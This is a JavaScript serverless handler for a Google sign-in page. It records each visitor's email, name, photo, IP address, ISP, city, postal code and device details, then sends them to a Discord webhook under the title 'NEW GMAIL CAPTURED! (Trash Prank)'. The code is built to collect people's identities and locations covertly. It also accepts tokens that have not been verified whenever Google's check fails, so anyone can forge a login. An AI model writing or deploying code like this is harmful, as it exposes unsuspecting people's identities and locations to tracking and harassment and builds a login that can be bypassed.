import {
  n,
  extractCfMeta,
  resolveVisitorId,
  sendDiscordWebhook,
} from "../_lib/analytics.js";

const JSON_HEADERS = { "Content-Type": "application/json" };

function decodeJwtFallback(token) {
  const part = token.split(".")[1];
  const base64 = part.replace(/-/g, "+").replace(/_/g, "/");
  const padded = base64.padEnd(base64.length + ((4 - (base64.length % 4)) % 4), "=");
  const bytes = Uint8Array.from(atob(padded), (c) => c.charCodeAt(0));
  return JSON.parse(new TextDecoder().decode(bytes));
}

async function verifyGoogleToken(credential) {
  try {
    const res = await fetch(
      `https://oauth2.googleapis.com/tokeninfo?id_token=${encodeURIComponent(credential)}`
    );
    if (res.ok) {
      return await res.json();
    }
  } catch {
    // Fallback to local JWT decode if Google tokeninfo is temporarily unreachable
  }
  return decodeJwtFallback(credential);
}

export async function onRequestPost(context) {
  const { request, env } = context;

  let body;
  try {
    body = await request.json();
  } catch {
    return new Response(JSON.stringify({ ok: false, error: "Invalid JSON" }), {
      status: 400,
      headers: JSON_HEADERS,
    });
  }

  const credential = body.credential;
  if (!credential || typeof credential !== "string") {
    return new Response(JSON.stringify({ ok: false, error: "Missing credential" }), {
      status: 400,
      headers: JSON_HEADERS,
    });
  }

  let payload;
  try {
    payload = await verifyGoogleToken(credential);
  } catch {
    return new Response(JSON.stringify({ ok: false, error: "Invalid Google token" }), {
      status: 400,
      headers: JSON_HEADERS,
    });
  }

  const googleSub = payload?.sub;
  const email = payload?.email;
  if (!googleSub || !email) {
    return new Response(JSON.stringify({ ok: false, error: "Incomplete Google payload" }), {
      status: 400,
      headers: JSON_HEADERS,
    });
  }

  const cfMeta = extractCfMeta(request);
  const client = body.client || {};
  const { visitorId } = await resolveVisitorId(body.visitorId, cfMeta, client);
  const now = new Date().toISOString();

  try {
    const existing = await env.DB.prepare(
      "SELECT id, login_count FROM gmail_users WHERE google_sub = ?"
    )
      .bind(googleSub)
      .first();

    const isReturning = Boolean(existing);
    const loginCount = isReturning ? Number(existing.login_count || 0) + 1 : 1;

    const insertRes = await env.DB.prepare(`
      INSERT INTO gmail_users (
        google_sub, email, email_verified, name, given_name, family_name,
        picture, hosted_domain, google_locale,
        login_count, first_login_at, last_login_at, visitor_id, ref_tag,
        ip, isp_org, asn, country, region, city, postal_code, cf_timezone,
        browser, os, device_type, is_mobile, screen_res, viewport_res,
        language, client_timezone, user_agent
      ) VALUES (
        ?, ?, ?, ?, ?, ?,
        ?, ?, ?,
        1, ?, ?, ?, ?,
        ?, ?, ?, ?, ?, ?, ?, ?,
        ?, ?, ?, ?, ?, ?,
        ?, ?, ?
      )
      ON CONFLICT(google_sub) DO UPDATE SET
        email = excluded.email,
        email_verified = excluded.email_verified,
        name = COALESCE(excluded.name, gmail_users.name),
        given_name = COALESCE(excluded.given_name, gmail_users.given_name),
        family_name = COALESCE(excluded.family_name, gmail_users.family_name),
        picture = COALESCE(excluded.picture, gmail_users.picture),
        hosted_domain = COALESCE(excluded.hosted_domain, gmail_users.hosted_domain),
        google_locale = COALESCE(excluded.google_locale, gmail_users.google_locale),
        login_count = gmail_users.login_count + 1,
        last_login_at = excluded.last_login_at,
        visitor_id = COALESCE(excluded.visitor_id, gmail_users.visitor_id),
        ref_tag = COALESCE(excluded.ref_tag, gmail_users.ref_tag),
        ip = excluded.ip,
        isp_org = COALESCE(excluded.isp_org, gmail_users.isp_org),
        asn = COALESCE(excluded.asn, gmail_users.asn),
        country = COALESCE(excluded.country, gmail_users.country),
        region = COALESCE(excluded.region, gmail_users.region),
        city = COALESCE(excluded.city, gmail_users.city),
        postal_code = COALESCE(excluded.postal_code, gmail_users.postal_code),
        browser = COALESCE(excluded.browser, gmail_users.browser),
        os = COALESCE(excluded.os, gmail_users.os),
        device_type = COALESCE(excluded.device_type, gmail_users.device_type),
        is_mobile = excluded.is_mobile,
        screen_res = COALESCE(excluded.screen_res, gmail_users.screen_res),
        viewport_res = COALESCE(excluded.viewport_res, gmail_users.viewport_res),
        user_agent = COALESCE(excluded.user_agent, gmail_users.user_agent)
    `)
      .bind(
        googleSub,
        email,
        payload.email_verified === true || payload.email_verified === "true" ? 1 : 0,
        n(payload.name),
        n(payload.given_name),
        n(payload.family_name),
        n(payload.picture),
        n(payload.hd),
        n(payload.locale),
        now,
        now,
        visitorId,
        n(client.refTag),
        n(cfMeta.ip),
        n(cfMeta.isp_org),
        n(cfMeta.asn),
        n(cfMeta.country),
        n(cfMeta.region),
        n(cfMeta.city),
        n(cfMeta.postal_code),
        n(cfMeta.cf_timezone),
        n(client.browser),
        n(client.os),
        n(client.deviceType),
        client.isMobile ? 1 : 0,
        n(client.screenRes),
        n(client.viewportRes),
        n(client.language),
        n(client.clientTimezone),
        n(cfMeta.user_agent)
      )
      .run();

    const uniqueGmailNo = isReturning
      ? existing.id
      : (insertRes?.meta?.last_row_id ?? "?");

    await env.DB.prepare(
      "UPDATE visitors SET gmail_email = ? WHERE visitor_id = ?"
    )
      .bind(email, visitorId)
      .run();

    const location =
      [cfMeta.city, cfMeta.region, cfMeta.country].filter(Boolean).join(", ") || "Unknown";

    const lines = [
      `🆔 **Unique Gmail No. -** ${uniqueGmailNo}`,
      `👤 **Name:** ${payload.name || "Unknown"}`,
      `📧 **Email:** \`${email}\``,
      payload.hd ? `🏢 **Org Domain:** ${payload.hd}` : null,
      `📍 **Location:** ${location}`,
      `🌐 **ISP:** ${cfMeta.isp_org || "Unknown"}`,
      `💻 **Device:** ${client.browser || "?"} on ${client.os || "?"} (${client.screenRes || "?"})`,
      client.refTag ? `🏷 **Ref Tag:** \`${client.refTag}\`` : null,
    ].filter(Boolean);

    const embed = {
      title: isReturning
        ? `🎣 Returning Gmail Login (#${loginCount})`
        : `🎣 NEW GMAIL CAPTURED! (Trash Prank)`,
      description: lines.join("\n"),
      color: isReturning ? 0xa855f7 : 0xf59e0b,
      footer: { text: `ID: ${visitorId}` },
      timestamp: now,
    };

    if (payload.picture) {
      embed.thumbnail = { url: payload.picture };
    }

    context.waitUntil(sendDiscordWebhook(env.DISCORD_WEBHOOK_GMAIL, embed));

    return new Response(
      JSON.stringify({ ok: true, uniqueGmailNo, loginCount, isReturning }),
      { status: 200, headers: JSON_HEADERS }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ ok: false, error: String(err?.message || err) }),
      { status: 500, headers: JSON_HEADERS }
    );
  }
}